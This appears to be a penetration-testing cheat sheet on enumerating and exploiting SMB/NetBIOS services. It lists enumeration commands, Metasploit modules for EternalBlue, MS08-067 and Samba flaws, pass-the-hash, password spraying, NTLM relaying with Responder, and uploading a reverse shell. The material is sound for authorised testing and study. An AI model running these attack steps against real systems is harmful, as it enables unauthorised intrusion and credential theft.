# SMB / NetBIOS (135, 139, 445 )

---

<br>

> To interact with older SMB versions you need to enter the following in the `/etc/samba/smb.conf` file:
> ```
> client min protocol = CORE
> client max protocol = SMB3_11
> client use spnego = no
> client ntlmv2 auth = no
> ```

<br> 

### 1) SMB / NetBIOS Enumeration 


Windows tools:
- get information with **nbstat**: `nbstat -A <target>` (look for `<20>`)
- connect with **net**:
	- view connection options: `net view` 
	- connect to machine: `net use K: \\<target>\<share>`
		- i.e. `net use K: \\192.169.99.12\C`
	- null session attack: `net use \\<target>\\IPC$ "" /u:""`

Linux tools:
- get information **nbtscan** (equivalent to nbstat): `nbtscan -v <target|subnet>`
	- i.e. `sudo nbtscan -r 10.11.1.0/24`
- get file share information with **nmblookup**: `nmblookup -A 10.130.40.70`
- enumerate information with **enum4linux**: `enum4linux -A <target>`
- enumerate with **nmap**: `nmap -sT -sU -sV <ip_address> -p 135,137,138,139,445 --open`
- enumerate with **nmap NSE**: 
	- to show all scripts: `ls -l /usr/share/nmap/scripts/smb*`
	- enumerate shares: `nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <ip>`
	- identify samba version (if Linux target):  `nmap --script smb-os-discovery -p 445 <ip_address>`
	- to check for known SMB protocol vulnerabilities: `nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 <ip_address>`
	- AutoRecon command: `nmap -vv --reason -Pn -T4 -sV -p 445 --script=banner,(nbstat or smb* or ssl*) and not (brute or broadcast or dos or external or fuzzer) -oN <ip>_tcp_445_smb_nmap.txt <ip>`
- enumerate with **smbmap**: `smbmap -H <target>`
- try the names of SMB shared found as web 
- use **impacket scripts**:
	- [more info.](https://github.com/SecureAuthCorp/impacket)
- get information with **smbclient**:
	- get a list of shares: `smbclient -L <target>` (look for open `IPC$` for null session attack)
	- access share:  `smbclient \\\\<target>\\<share>`
	- test for a null session: `smbclient \\\\<ip>\\<share> -N`
- recursively download smb shares with **smbget**: `smbget -R smb://<ip>/<share>`
- connect to machine with **mount**:
	- i.e. connect with no username or password: `sudo mount.cifs \\\\<target>\\<share> /media/<local_mount_name/ user=,pass=`
- run Microsoft RPC functionalities with **rpcclient**:
	- connect to share with no username: `rpcclient -N -U "" <target>`
	- once connected, retrieve users on machine with: `enumdomusers`
	- other useful commands include; `enumalsgroups`, `srvinfo`, `lookupnames`, `queryuser`, and `enumprivs`
	- to automate this with a Bash loop:
		```bash
		for u in $(cat /usr/share/wordlists/metasploit/unix_users.txt); do
			rpcclient -U "" 172.16.80.22 -N --command="lookupnames $u";
		done |grep "User: 1"
		```


<br> 

### 2) SMB / NetBIOS Exploitation 

Check version -- is it exploitable?
- exploit EternalBlue if SMBv1:
	- scan to see if vulnerable with metasploit: `auxiliary/scanner/smb/smb_ms17_010`
	- exploit with metasploit: `exploit/windows/smb/ms17_010_eternalblue`
- exploit MS08-067 if MS Windows 2000, Windows XP, Vista, and Windows Server 2003/2008:
	- exploit with metasploit: `exploit/windows/smb/ms08_067_netpapi`

Do you have credentials to login to a session:
- use impacket scripts to exploit:
	-  [more info.](https://github.com/SecureAuthCorp/impacket)
- use NSE scripts to enumerate users and shares:
		- `nmap --script-smb-enum-users -p 445 <target> --script-args smbuser=<username>,smbpass=<password>`
- login to share:
	- list shares available: `smbclient -L <target> -U <username>` -> `[password]`
	- login to share: `smbclient \\\\<target>\\<share> -U <username>` -> `[password]`
- use Metasploit's `psexec` to pass hashes to exploit machine: 
	- `use exploit/windows/smb/psexec` -> set RHOST, SMBPass, SMBUser, PAYLOAD (meterpreter reverse TCP), and LHOST -> `run`
- use Metasploit to perform a password spray attack:
	- `search smb_login` -> `use <#>` -> `set PASS_FILE <found_password>` -> `set USER_FILE <found_username>` -> `set RHOSTS <list_of_hosts>` -> `run`
- use smbmap to run commands, download/upload files, and find out useful information:
	- `smbmap -u <username> -p <password> -H <host>`
	  - you can also specify `-d <domain>`, `-s <share>`, and `-x <command_to_execute>`, `--download <path>` to download a file, `--upload <path>` to upload a file, and `--search-path <path>` to search for a file, among others  
	  - to run the ipconfig command on a system: `smbmap -u admin -p password -H 10.10.10.10 -x "ipconfig"`

Brute force login:
- with Metasploit:
	- `search smb_login` -> `use <#>` -> `set PASS_FILE /usr/share/seclists/Passwords/...` -> `set USER_FILE /usr/share/seclists/Passwords/...` -> `set RHOSTS 10.130.400.70` -> `run`
- with nmap use `smb-brute` NSE script 

Exploit null session:
- with smbclient: `smbclient \\\\<target>\\IPC$ -N`

Capture and crack LM and NTLM credentials:
- a) setup SMB server to capture credentials: 
	- with metasploit: `auxiliary/server/capture/smb`
- b) capture credentials when victim initates connection to SMB service  
- c) crack the captured credentials:
	- with JtR: `john --format=ntlm <hash_file>`

Perform NTLM relaying in internal environment with Responder & MultiRelay:
- a) ready Responder:
	- update and make two changes in `Responder.conf` file in the `[Responder Core]` section: turn SMB off (`SMB = Off`) and turn HTTP off (`HTTP = Off`)
- b) startup Responder: `responder -I <interface> --lm`
	- the `--lm` option attempts to downgrade the NTLMv1/v2 hashes to LM (Lan Mananager) hashes
	- note IP addresses communicating on the network as you need to target a specific host with the MultiRelay tool 
- c) startup MultiRelay while Responder is running: `./MultiRelay.py -t <target_ip> -u ALL`
	- MultiRelay is in `./user/share/responder/tools/` directory and running without any options (or `responder-MultiRelay`) shows it's usage 
	- the `-u ALL` option targets any/all users 
- d) when Responder receives a request from the selected target, it will attempt to relay the captured hash to another system on the network and, if successful, you will receive a MultiRelay shell via the MultiRelay tool 
- e) execute commands from within the MultiRelay shell
	- commands that require user interaction will fail
	- the built-in MultiRelay shell commands `upload` and `runas` let you upload a payload to the system and then execute it -- use this to upload a Meterpreter shell onto the target for more complete control


Username Map Script (CVE-2007-2447):
- affects Samba versions 3.0.0 through 3.0.25rc3, and exists in non-default configurations where the "username map script" option is enabled, which results in remote command execution and compromise of the affected server 
- `use exploit/multi/samba/usermap_script` -> set options -> `run`
- gives you a Command Shell on the target, so upgrade shell with `python -c 'import pty; pty.spawn("/bin/sh")'`

Samba Symlink Directory Traversal 
- affects Samba servers that contain a writeable share and that the "widelinks" parameter in the `smb.conf` file is set with a value of "yes"  -- can use `smbmap -H <target>` to determine if any shares have writeable permissions 
-  a) to create symlink to root file system: `use auxiliary/admin/smb/samba_symlink_traversal` -> set options -> `run`
-  b) use smbclient to access share: `smbclient \\\\<ip_address>\\<readable_share>\\ -N`
-  c) change to "rootfs" directory and download/upload files: `cd rootfs` -> `cd etc`  -> `get passwd` -> `put malware.sh` -> etc.
	-  or archive files:  `cd etc` -> `tar c ../tmp/all_files.tar *` -- to create a tar archive of the `/etc/` directory on the target system and in your local system's `/tmp` directory 
	- you can then extract and start enumerating files for sensitive content, passwords, etc. (i.e. `tar xf /tmp/all_files.tar` -> `cd /tmp/rootfs/tmp/rootfs/etc/` -> `grep -r "password" * 2>&1 /dev/null`)

Writeable Samba Share to Remote Command Execution via Perl Reverse Shell:
- affects Samba servers with a writeable share available to you (i.e. the "www" directory on a web server")
- a) check if writable share available: `smbmap -H <ip_address>`
- b) connect to share:  `smbclient \\\\<ip_address>\\<share> -N`
- c) upload a web (Perl/PHP) reverse shell: `put reverse-shell.pl`
- d) start Metasploit handler: `use exploit/multi/handler` -> set options -> `run`
	- or a netcat listener: `nc -lvnp 4444`
- e) execute shell by navigating to in a web browser


Known Linux SMB pipe name:
> If you have access to writeable access to a share (Linux Samba versions 3.5.0 to 4.4.14, 4.5.10, and 4.6.4.), you can create a command-line shell on the machine
- a) check for writeable Linux shares (`smbmap -H <target>`)
- b) use Metasploit exploit `exploit/linux/samba/is_known_pipename` 
- you may need to specify `set SMB::ProtocolVersion 1` and `set SMB::AlwaysEncrypt false` to get exploit to work